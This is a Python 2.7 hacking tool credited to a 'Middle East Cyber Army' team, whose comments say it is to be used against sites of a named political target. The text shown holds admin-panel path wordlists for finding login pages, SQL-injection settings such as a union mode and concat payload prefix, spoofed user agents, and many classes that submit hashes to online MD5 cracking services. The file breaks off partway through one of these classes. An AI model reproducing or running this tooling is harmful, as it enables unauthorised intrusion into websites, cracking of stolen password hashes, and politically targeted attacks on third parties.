#!user/bin/python 2.7
#This Tool Is Coded By RebelGhost Dx !
#We Are MECA Team (Middle East Cyber Army )
#USE IT ONLY AGAIN ZIONIST SITES !!!
#Free Gaza Free Palastine 
#INSHAELLAH  WE HELP U  WITH THIS TOOL 
#THIS MECA AGAIN BROO ;) 

try:
    from time import gmtime, strftime
    import urllib, sys, re, os, socket, httplib, urllib2, time, random
    import hashlib
    import urllib2
    import getopt
    from os import path
    from urllib import urlencode
    from re import search, findall
    from random import seed, randint
    from base64 import decodestring, encodestring
    from cookielib import LWPCookieJar
except ImportError:
    print """
Execution Error:

  You required some basic Python libraries. 
  
  This application use: sys, hashlib, urllib, urllib2, os, re, random, getopt, base64 , socket, httplib, time, random  and cookielib.

  Please, check if you have all of them installed in your system.

"""
    sys.exit(1)


php = ['admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
'memberadmin/','administratorlogin/','adm/','admin/account.php','admin/index.php','admin/login.php','admin/admin.php','admin/account.php',
'admin_area/admin.php','admin_area/login.php','siteadmin/login.php','siteadmin/index.php','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
'admin_area/index.php','articles/connexion.php','bb-admin/index.php','bb-admin/login.php','bb-admin/admin.php','admin/home.php','admin_area/login.html','admin_area/index.html',
'admin/controlpanel.php','admin.php','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
'admin/cp.php','cp.php','administrator/index.php','administrator/login.php','nsw/admin/login.php','webadmin/login.php','admin/admin_login.php','admin_login.php',
'administrator/account.php','administrator.php','admin_area/admin.html','pages/admin/admin-login.php','admin/admin-login.php','admin-login.php',
'bb-admin/index.html','bb-admin/login.html','acceso.php','bb-admin/admin.html','admin/home.html','login.php','modelsearch/login.php','moderator.php','moderator/login.php',
'moderator/admin.php','account.php','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.php','admincontrol.php',
'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.php','adminarea/index.html','adminarea/admin.html',
'webadmin.php','webadmin/index.php','webadmin/admin.php','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.php','moderator.html',
'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.php','account.html','controlpanel.html','admincontrol.html',
'panel-administracion/login.php','wp-login.php','adminLogin.php','admin/adminLogin.php','home.php','admin.php','adminarea/index.php',
'adminarea/admin.php','adminarea/login.php','panel-administracion/index.php','panel-administracion/admin.php','modelsearch/index.php',
'modelsearch/admin.php','admincontrol/login.php','adm/admloginuser.php','admloginuser.php','admin2.php','admin2/login.php','admin2/index.php','usuarios/login.php',
'adm/index.php','adm.php','affiliate.php','adm_auth.php','memberadmin.php','administratorlogin.php']

jerar=[]
MD4	= "md4"
MD5 	= "md5"
SHA1 	= "sha1"
SHA224	= "sha224"
SHA256 	= "sha256"
SHA384	= "sha384"
SHA512 	= "sha512"
RIPEMD	= "rmd160"
LM 	= "lm"
NTLM	= "ntlm"
MYSQL	= "mysql"
CISCO7	= "cisco7"
JUNIPER = "juniper"
GOST	= "gost"
a=0
cgi = ['admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
'memberadmin/','administratorlogin/','adm/','admin/account.cgi','admin/index.cgi','admin/login.cgi','admin/admin.cgi','admin/account.cgi',
'admin_area/admin.cgi','admin_area/login.cgi','siteadmin/login.cgi','siteadmin/index.cgi','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
'admin_area/index.cgi','bb-admin/index.cgi','bb-admin/login.cgi','bb-admin/admin.cgi','admin/home.cgi','admin_area/login.html','admin_area/index.html',
'admin/controlpanel.cgi','admin.cgi','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
'admin/cp.cgi','cp.cgi','administrator/index.cgi','administrator/login.cgi','nsw/admin/login.cgi','webadmin/login.cgi','admin/admin_login.cgi','admin_login.cgi',
'administrator/account.cgi','administrator.cgi','admin_area/admin.html','pages/admin/admin-login.cgi','admin/admin-login.cgi','admin-login.cgi',
'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.cgi','modelsearch/login.cgi','moderator.cgi','moderator/login.cgi',
'moderator/admin.cgi','account.cgi','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.cgi','admincontrol.cgi',
'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.cgi','adminarea/index.html','adminarea/admin.html',
'webadmin.cgi','webadmin/index.cgi','acceso.cgi','webadmin/admin.cgi','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.cgi','moderator.html',
'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.cgi','account.html','controlpanel.html','admincontrol.html',
'panel-administracion/login.cgi','wp-login.cgi','adminLogin.cgi','admin/adminLogin.cgi','home.cgi','admin.cgi','adminarea/index.cgi',
'adminarea/admin.cgi','adminarea/login.cgi','panel-administracion/index.cgi','panel-administracion/admin.cgi','modelsearch/index.cgi',
'modelsearch/admin.cgi','admincontrol/login.cgi','adm/admloginuser.cgi','admloginuser.cgi','admin2.cgi','admin2/login.cgi','admin2/index.cgi','usuarios/login.cgi',
'adm/index.cgi','adm.cgi','affiliate.cgi','adm_auth.cgi','memberadmin.cgi','administratorlogin.cgi']
var1=0
var2=0
WHIRLPOOL = "whirlpool"
LDAP_MD5 = "ldap_md5"
LDAP_SHA1 = "ldap_sha1"
hashvalue = None
hashfile  = None
googlesearch = False
arg_end = "--"
arg_eva = "+" 
colMax = 200
hash = ''
brf = ['admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
'memberadmin/','administratorlogin/','adm/','admin/account.brf','admin/index.brf','admin/login.brf','admin/admin.brf','admin/account.brf',
'admin_area/admin.brf','admin_area/login.brf','siteadmin/login.brf','siteadmin/index.brf','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
'admin_area/index.brf','bb-admin/index.brf','bb-admin/login.brf','bb-admin/admin.brf','admin/home.brf','admin_area/login.html','admin_area/index.html',
'admin/controlpanel.brf','admin.brf','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
'admin/cp.brf','cp.brf','administrator/index.brf','administrator/login.brf','nsw/admin/login.brf','webadmin/login.brfbrf','admin/admin_login.brf','admin_login.brf',
'administrator/account.brf','administrator.brf','acceso.brf','admin_area/admin.html','pages/admin/admin-login.brf','admin/admin-login.brf','admin-login.brf',
'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.brf','modelsearch/login.brf','moderator.brf','moderator/login.brf',
'moderator/admin.brf','account.brf','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.brf','admincontrol.brf',
'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.brf','adminarea/index.html','adminarea/admin.html',
'webadmin.brf','webadmin/index.brf','webadmin/admin.brf','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.brf','moderator.html',
'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.brf','account.html','controlpanel.html','admincontrol.html',
'panel-administracion/login.brf','wp-login.brf','adminLogin.brf','admin/adminLogin.brf','home.brf','admin.brf','adminarea/index.brf',
'adminarea/admin.brf','adminarea/login.brf','panel-administracion/index.brf','panel-administracion/admin.brf','modelsearch/index.brf',
'modelsearch/admin.brf','admincontrol/login.brf','adm/admloginuser.brf','admloginuser.brf','admin2.brf','admin2/login.brf','admin2/index.brf','usuarios/login.brf',
'adm/index.brf','adm.brf','affiliate.brf','adm_auth.brf','memberadmin.brf','administratorlogin.brf']

socket.setdefaulttimeout(10)
logfile = "PRO_INJECTOR.log"
tablefuzz = "tablesfuzz.txt"
columnfuzz = "columnsfuzz.txt"
loadfilefuzz = "loadfilefuzz.txt"

asp = ['admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
'memberadmin/','administratorlogin/','adm/','account.asp','admin/account.asp','admin/index.asp','admin/login.asp','admin/admin.asp',
'admin_area/admin.asp','admin_area/login.asp','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
'admin_area/admin.html','admin_area/login.html','admin_area/index.html','admin_area/index.asp','bb-admin/index.asp','bb-admin/login.asp','bb-admin/admin.asp',
'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','admin/controlpanel.html','admin.html','admin/cp.html','cp.html',
'administrator/index.html','administrator/login.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html','moderator.html',
'moderator/login.html','moderator/admin.html','account.html','controlpanel.html','admincontrol.html','admin_login.html','panel-administracion/login.html',
'admin/home.asp','admin/controlpanel.asp','admin.asp','pages/admin/admin-login.asp','admin/admin-login.asp','admin-login.asp','admin/cp.asp','cp.asp',
'administrator/account.asp','administrator.asp','acceso.asp','login.asp','modelsearch/login.asp','moderator.asp','moderator/login.asp','administrator/login.asp',
'moderator/admin.asp','controlpanel.asp','admin/account.html','adminpanel.html','webadmin.html','pages/admin/admin-login.html','admin/admin-login.html',
'webadmin/index.html','webadmin/admin.html','webadmin/login.html','user.asp','user.html','admincp/index.asp','admincp/login.asp','admincp/index.html',
'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','adminarea/index.html','adminarea/admin.html','adminarea/login.html',
'panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admin/admin_login.html',
'admincontrol/login.html','adm/index.html','adm.html','admincontrol.asp','admin/account.asp','adminpanel.asp','webadmin.asp','webadmin/index.asp',
'webadmin/admin.asp','webadmin/login.asp','admin/admin_login.asp','admin_login.asp','panel-administracion/login.asp','adminLogin.asp',
'admin/adminLogin.asp','home.asp','admin.asp','adminarea/index.asp','adminarea/admin.asp','adminarea/login.asp','admin-login.html',
'panel-administracion/index.asp','panel-administracion/admin.asp','modelsearch/index.asp','modelsearch/admin.asp','administrator/index.asp',
'admincontrol/login.asp','adm/admloginuser.asp','admloginuser.asp','admin2.asp','admin2/login.asp','admin2/index.asp','adm/index.asp',
'adm.asp','affiliate.asp','adm_auth.asp','memberadmin.asp','administratorlogin.asp','siteadmin/login.asp','siteadmin/index.asp','siteadmin/login.html']

algorithms={"102020":"ADLER-32", "102040":"CRC-32", "102060":"CRC-32B", "101020":"CRC-16", "101040":"CRC-16-CCITT", "104020":"DES(Unix)", "101060":"FCS-16", "103040":"GHash-32-3", "103020":"GHash-32-5", "115060":"GOST R 34.11-94", "109100":"Haval-160", "109200":"Haval-160(HMAC)", "110040":"Haval-192", "110080":"Haval-192(HMAC)", "114040":"Haval-224", "114080":"Haval-224(HMAC)", "115040":"Haval-256", "115140":"Haval-256(HMAC)", "107080":"Lineage II C4", "106025":"Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))", "102080":"XOR-32", "105060":"MD5(Half)", "105040":"MD5(Middle)", "105020":"MySQL", "107040":"MD5(phpBB3)", "107060":"MD5(Unix)", "107020":"MD5(Wordpress)", "108020":"MD5(APR)", "106160":"Haval-128", "106165":"Haval-128(HMAC)", "106060":"MD2", "106120":"MD2(HMAC)", "106040":"MD4", "106100":"MD4(HMAC)", "106020":"MD5", "106080":"MD5(HMAC)", "106140":"MD5(HMAC(Wordpress))", "106029":"NTLM", "106027":"RAdmin v2.x", "106180":"RipeMD-128", "106185":"RipeMD-128(HMAC)", "106200":"SNEFRU-128", "106205":"SNEFRU-128(HMAC)", "106220":"Tiger-128", "106225":"Tiger-128(HMAC)", "106240":"md5($pass.$salt)", "106260":"md5($salt.'-'.md5($pass))", "106280":"md5($salt.$pass)", "106300":"md5($salt.$pass.$salt)", "106320":"md5($salt.$pass.$username)", "106340":"md5($salt.md5($pass))", "106360":"md5($salt.md5($pass).$salt)", "106380":"md5($salt.md5($pass.$salt))", "106400":"md5($salt.md5($salt.$pass))", "106420":"md5($salt.md5(md5($pass).$salt))", "106440":"md5($username.0.$pass)", "106460":"md5($username.LF.$pass)", "106480":"md5($username.md5($pass).$salt)", "106500":"md5(md5($pass))", "106520":"md5(md5($pass).$salt)", "106540":"md5(md5($pass).md5($salt))", "106560":"md5(md5($salt).$pass)", "106580":"md5(md5($salt).md5($pass))", "106600":"md5(md5($username.$pass).$salt)", "106620":"md5(md5(md5($pass)))", "106640":"md5(md5(md5(md5($pass))))", "106660":"md5(md5(md5(md5(md5($pass)))))", "106680":"md5(sha1($pass))", "106700":"md5(sha1(md5($pass)))", "106720":"md5(sha1(md5(sha1($pass))))", "106740":"md5(strtoupper(md5($pass)))", "109040":"MySQL5 - SHA-1(SHA-1($pass))", "109060":"MySQL 160bit - SHA-1(SHA-1($pass))", "109180":"RipeMD-160(HMAC)", "109120":"RipeMD-160", "109020":"SHA-1", "109140":"SHA-1(HMAC)", "109220":"SHA-1(MaNGOS)", "109240":"SHA-1(MaNGOS2)", "109080":"Tiger-160", "109160":"Tiger-160(HMAC)", "109260":"sha1($pass.$salt)", "109280":"sha1($salt.$pass)", "109300":"sha1($salt.md5($pass))", "109320":"sha1($salt.md5($pass).$salt)", "109340":"sha1($salt.sha1($pass))", "109360":"sha1($salt.sha1($salt.sha1($pass)))", "109380":"sha1($username.$pass)", "109400":"sha1($username.$pass.$salt)", "1094202":"sha1(md5($pass))", "109440":"sha1(md5($pass).$salt)", "109460":"sha1(md5(sha1($pass)))", "109480":"sha1(sha1($pass))", "109500":"sha1(sha1($pass).$salt)", "109520":"sha1(sha1($pass).substr($pass,0,3))", "109540":"sha1(sha1($salt.$pass))", "109560":"sha1(sha1(sha1($pass)))", "109580":"sha1(strtolower($username).$pass)", "110020":"Tiger-192", "110060":"Tiger-192(HMAC)", "112020":"md5($pass.$salt) - Joomla", "113020":"SHA-1(Django)", "114020":"SHA-224", "114060":"SHA-224(HMAC)", "115080":"RipeMD-256", "115160":"RipeMD-256(HMAC)", "115100":"SNEFRU-256", "115180":"SNEFRU-256(HMAC)", "115200":"SHA-256(md5($pass))", "115220":"SHA-256(sha1($pass))", "115020":"SHA-256", "115120":"SHA-256(HMAC)", "116020":"md5($pass.$salt) - Joomla", "116040":"SAM - (LM_hash:NT_hash)", "117020":"SHA-256(Django)", "118020":"RipeMD-320", "118040":"RipeMD-320(HMAC)", "119020":"SHA-384", "119040":"SHA-384(HMAC)", "120020":"SHA-256", "121020":"SHA-384(Django)", "122020":"SHA-512", "122060":"SHA-512(HMAC)", "122040":"Whirlpool", "122080":"Whirlpool(HMAC)"}

USER_AGENTS = [
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Crazy Browser 1.0.5)",
	"curl/7.7.2 (powerpc-apple-darwin6.0) libcurl 7.7.2 (OpenSSL 0.9.6b)",
	"Mozilla/5.0 (X11; U; Linux amd64; en-US; rv:5.0) Gecko/20110619 Firefox/5.0",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b8pre) Gecko/20101213 Firefox/4.0b8pre",
	"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) chromeframe/10.0.648.205",
	"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)",
	"Opera/9.80 (Windows NT 6.1; U; sv) Presto/2.7.62 Version/11.01",
	"Opera/9.80 (Windows NT 6.1; U; pl) Presto/2.7.62 Version/11.00",
	"Opera/9.80 (X11; Linux i686; U; pl) Presto/2.6.30 Version/10.61",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.861.0 Safari/535.2",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.872.0 Safari/535.2",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.812.0 Safari/535.1",
	"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
	]

cfm = ['admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
'memberadmin/','administratorlogin/','adm/','admin/account.cfm','admin/index.cfm','admin/login.cfm','admin/admin.cfm','admin/account.cfm',
'admin_area/admin.cfm','admin_area/login.cfm','siteadmin/login.cfm','siteadmin/index.cfm','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
'admin_area/index.cfm','bb-admin/index.cfm','bb-admin/login.cfm','bb-admin/admin.cfm','admin/home.cfm','admin_area/login.html','admin_area/index.html',
'admin/controlpanel.cfm','admin.cfm','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
'admin/cp.cfm','cp.cfm','administrator/index.cfm','administrator/login.cfm','nsw/admin/login.cfm','webadmin/login.cfm','admin/admin_login.cfm','admin_login.cfm',
'administrator/account.cfm','administrator.cfm','admin_area/admin.html','pages/admin/admin-login.cfm','admin/admin-login.cfm','admin-login.cfm',
'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.cfm','modelsearch/login.cfm','moderator.cfm','moderator/login.cfm',
'moderator/admin.cfm','account.cfm','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.cfm','admincontrol.cfm',
'admin/adminLogin.html','acceso.cfm','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.cfm','adminarea/index.html','adminarea/admin.html',
'webadmin.cfm','webadmin/index.cfm','webadmin/admin.cfm','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.cfm','moderator.html',
'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.cfm','account.html','controlpanel.html','admincontrol.html',
'panel-administracion/login.cfm','wp-login.cfm','adminLogin.cfm','admin/adminLogin.cfm','home.cfm','admin.cfm','adminarea/index.cfm',
'adminarea/admin.cfm','adminarea/login.cfm','panel-administracion/index.cfm','panel-administracion/admin.cfm','modelsearch/index.cfm',
'modelsearch/admin.cfm','admincontrol/login.cfm','adm/admloginuser.cfm','admloginuser.cfm','admin2.cfm','admin2/login.cfm','admin2/index.cfm','usuarios/login.cfm',
'adm/index.cfm','adm.cfm','affiliate.cfm','adm_auth.cfm','memberadmin.cfm','administratorlogin.cfm']
RebelG=[]
site = ""
proxy = "None"
arg_string = ""
arg_blind = "--union"
arg_table = "None"
arg_database = "None"
arg_columns = "None"
arg_row = "Rows"
arg_cookie = "None"
arg_insert = "None"
arg_where = ""
arg_orderby = ""
arg_debug = "off"
arg_rowdisp = 1
arg_adminusers = 10
arg_wordlist = ""
arg_ssl = "off"
arg_proxy_auth = ""
MECA = "concat(0x1e,0x1e,"
mode = "None"
lower_bound = 0
upper_bound = 16069
line_URL = ""
count_URL = ""
cur_db = ""
cur_table = ""
terminal = ""
count = 0
gets = 0
table_num = 0
num = 0
ser_ver = 3
version =[]
let_pos = 1
lim_num = 0
agent = ""
ip = ""
Dork = ''
 
class SCHWETT:
	
	name = 		"schwett"
	url = 		"http://schwett.com"
	supported_algorithm = [MD5]
	
	def isSupported (self, alg):
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False


	def crack (self, hashvalue, alg):
		
		
		if not self.isSupported (alg):
			return None
		
		url = "http://schwett.com/md5/index.php?md5value=%s&md5c=Hash+Match" % (hashvalue)
		
		response = do_HTTP_request ( url )
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r"<h3><font color='red'>No Match Found</font></h3><br />", html)
		if match:
			return None
		else:
			return "The hash is broken, please contact with La X marca el lugar and send it the hash value to add the correct regexp."


class NETMD5CRACK:

	name = 		"netmd5crack"
	url = 		"http://www.netmd5crack.com"
	supported_algorithm = [MD5]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False


	def crack (self, hashvalue, alg):
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		url = "http://www.netmd5crack.com/cgi-bin/Crack.py?InputHash=%s" % (hashvalue)
		
		response = do_HTTP_request ( url )
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		regexp = r'<tr><td class="border">%s</td><td class="border">[^<]*</td></tr></table>' % (hashvalue)
		match = search (regexp, html)
		
		if match:
			match2 = search ( "Sorry, we don't have that hash in our database", match.group() )
			if match2:
				return None
			else:
				return match.group().split('border')[2].split('<')[0][2:]



class MD5_CRACKER:
	
	name = 		"md5-cracker"
	url = 		"http://www.md5-cracker.tk"
	supported_algorithm = [MD5]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False


	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://www.md5-cracker.tk/xml.php?md5=%s" % (hashvalue)
		
		
		response = do_HTTP_request ( url )
		
		
		if response:
			try:
				doc = parseDoc ( response.read() )
			except:
				print "INFO: You need libxml2 to use this plugin."
				return None
		else:
			return None
		
		result = doc.xpathEval("//data")
		if len(result):
			return result[0].content
		else:
			return None


class BENRAMSEY:
	
	name = 		"benramsey"
	url = 		"http://tools.benramsey.com"
	supported_algorithm = [MD5]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False


	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://tools.benramsey.com/md5/md5.php?hash=%s" % (hashvalue)
		
		
		response = do_HTTP_request ( url )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
			
		match = search (r'<string><!\[CDATA\[[^\]]*\]\]></string>', html)
		
		if match:
			return match.group().split(']')[0][17:]
		else:
			return None



class GROMWEB: 
	
	name = 		"gromweb"
	url = 		"http://md5.gromweb.com"
	supported_algorithm = [MD5]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False


	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://md5.gromweb.com/query/%s" % (hashvalue)
		
		
		response = do_HTTP_request ( url )
		
		
		if response:
			return response.read()
			
		return response
		
		


class HASHCRACKING:
	
	name = 		"hashcracking"
	url = 		"http://md5.hashcracking.com"
	supported_algorithm = [MD5]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False


	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://md5.hashcracking.com/search.php?md5=%s" % (hashvalue)
		
		
		response = do_HTTP_request ( url )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r'\sis.*', html)
		
		if match:
			return match.group()[4:]
			
		return None



class VICTOROV:
	
	name = 		"hashcracking"
	url = 		"http://victorov.su"
	supported_algorithm = [MD5]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False


	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://victorov.su/md5/?md5e=&md5d=%s" % (hashvalue)
		
		
		response = do_HTTP_request ( url )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r': <b>[^<]*</b><br><form action="">', html)
		
		if match:
			return match.group().split('b>')[1][:-2]
			
		return None


class THEKAINE: 
	
	name = 		"thekaine"
	url = 		"http://md5.thekaine.de"
	supported_algorithm = [MD5]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False


	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://md5.thekaine.de/?hash=%s" % (hashvalue)
		
		
		response = do_HTTP_request ( url )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r'<td colspan="2"><br><br><b>[^<]*</b></td><td></td>', html)
		
		if match:
			
			match2 = search (r'not found', match.group() )
			
			if match2:
				return None
			else:
				return match.group().split('b>')[1][:-2]
			


class TMTO:
	
	name = 		"tmto"
	url = 		"http://www.tmto.org"
	supported_algorithm = [MD5]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False


	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://www.tmto.org/api/latest/?hash=%s&auth=true" % (hashvalue)
		
		
		response = do_HTTP_request ( url )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r'text="[^"]+"', html)
		
		if match:
			return decodestring(match.group().split('"')[1])
		else:
			return None


class MD5_DB:
	
	name = 		"md5-db"
	url = 		"http://md5-db.de"
	supported_algorithm = [MD5]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False


	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://md5-db.de/%s.html" % (hashvalue)
		
		
		response = do_HTTP_request ( url )
		
		
		if not response:
			return None
			
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r'<strong>Es wurden 1 m.gliche Begriffe gefunden, die den Hash \w* verwenden:</strong><ul><li>[^<]*</li>', html)
		
		if match:
			return match.group().split('li>')[1][:-2]
		else:
			return None




class MY_ADDR:
	
	name = 		"my-addr"
	url = 		"http://md5.my-addr.com"
	supported_algorithm = [MD5]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False


	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://md5.my-addr.com/md5_decrypt-md5_cracker_online/md5_decoder_tool.php"
		
		
		params = { "md5" : hashvalue,
			   "x" : 21,
			   "y" : 8 }
		
		
		response = do_HTTP_request ( url, params )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r"<span class='middle_title'>Hashed string</span>: [^<]*</div>", html)
		
		if match:
			return match.group().split('span')[2][3:-6]
		else:
			return None




class MD5PASS:
	
	name = 		"md5pass"
	url = 		"http://md5pass.info"
	supported_algorithm = [MD5]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False


	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = self.url
		
		
		params = { "hash" : hashvalue,
			   "get_pass" : "Get Pass" }
		
		
		response = do_HTTP_request ( url, params )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r"Password - <b>[^<]*</b>", html)
		
		if match:
			return match.group().split('b>')[1][:-2]
		else:
			return None



class MD5DECRYPTION:
	
	name = 		"md5decryption"
	url = 		"http://md5decryption.com"
	supported_algorithm = [MD5]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False


	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = self.url
		
		
		params = { "hash" : hashvalue,
			   "submit" : "Decrypt It!" }
		
		
		response = do_HTTP_request ( url, params )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r"Decrypted Text: </b>[^<]*</font>", html)
		
		if match:
			return match.group().split('b>')[1][:-7]
		else:
			return None



class MD5CRACK:
	
	name = 		"md5crack"
	url = 		"http://md5crack.com"
	supported_algorithm = [MD5]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False


	def crack (self, hashvalue, alg):
		
		
		
